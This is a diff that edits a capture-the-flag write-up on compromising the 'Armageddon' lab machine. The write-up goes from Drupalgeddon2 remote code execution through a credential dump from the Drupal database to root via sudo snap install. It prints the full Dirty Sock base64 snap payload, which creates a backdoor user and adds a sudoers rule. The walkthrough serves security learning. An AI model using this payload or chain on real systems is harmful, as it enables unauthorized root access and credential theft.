@@ -28,6 +28,7 @@ PORT   STATE SERVICE VERSION
 | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
 | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php
 ```
+Like WordPress, Drupal is a content management system (CMS) used widely by people for creating and maintaining websites and application for all sort of purposes.
 ## Website
 Upon visiting the website on port 80 we are presented with this Login page. We can neither log in nor register an account.
 ![](/assets/img/armageddon_box.png#center)
@@ -56,9 +57,16 @@ Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command E
 Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                           | php/webapps/46452.txt
 ```
 # Exploitation
-After trying out some stuff the only think working for me was this _metasploit_ module `exploit/unix/webapp/drupal_drupalgeddon2 - Drupal Drupalgeddon 2 Forms API Property Injection`.
+After trying out some stuff the only thing working for me was this _metasploit_ module `exploit/unix/webapp/drupal_drupalgeddon2 - Drupal Drupalgeddon 2 Forms API Property Injection`.
 
-We need to set _RHOSTS_ to the armageddon machines IP (10.10.10.233) and change the _LHOST_ to our IP. After running the exploit, we get a shell with the user `apache`.
+We need to set _RHOSTS_ to the armageddon machines IP (10.10.10.233) and change the _LHOST_ to our local machine IP. After running the exploit, we get a shell with the user `apache`.
+
+## Drupalgeddon 2
+Drupalgeddon 2.0 is an alias for Drupal vulnerability `SA-CORE-2018-002`. It is associated with `CVE_2018-7600`, a remote code execution vulnerability found in several variants of Drupal, including 8.5 prior to 8.5.1, 7.x prior to 7.58 and all version of Drupal 6.
+
+The Drupal exploit occurs via a specially crafted HTTP POST request sent to a Drupal default /user/register page, allowing the attacker to perform unauthenticated remote code execution.
+
+You can find a more detailed explanation in this great [article](https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/).
 # Lateral movement
 If we look at the files with `ls -alt`, we see a `.gitignore` that contains:
 ``` bash
@@ -91,7 +99,7 @@ $databases = array (
 ```
 Connect with `mysql -u drupaluser -D drupal -p` to the database. There are quite a few tables, but the most interesting one is the `user` table.
 
-So lets check the contents of that table with `SELECT * FROM users; exit;`, because of the broken metasploit shell we have to append _exit;_ to every query or we won't get any output. 
+So lets check the contents of that table with `SELECT * FROM users; exit;`, because of the broken metasploit shell we have to append _exit;_ to every query or we won't get any output. We could also try to fix the shell but we already got what we want. (^_~)
 ``` mysql
 select * from users; exit;
 uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
@@ -120,7 +128,7 @@ With `sudo -l` we can check what we can run with root privilege.
 User brucetherealadmin may run the following commands on armageddon:
     (root) NOPASSWD: /usr/bin/snap install *
 ```
-Googling for "privilege escalation snap" we quickly find lots of ressources and a [PoC](https://github.com/initstring/dirty_sock). The script doesn't work but we only need the payload for the file. So let's do it manually.
+Googling for "privilege escalation snap" we are presented with a so called `Dirty Sock` exploit. Make sure to read this [article](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html) before continuing. We are going to use this [PoC](https://github.com/initstring/dirty_sock). The script doesn't work but we only need the payload for the file. So let's do it manually.
 ``` bash
 python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > root.snap
 ```
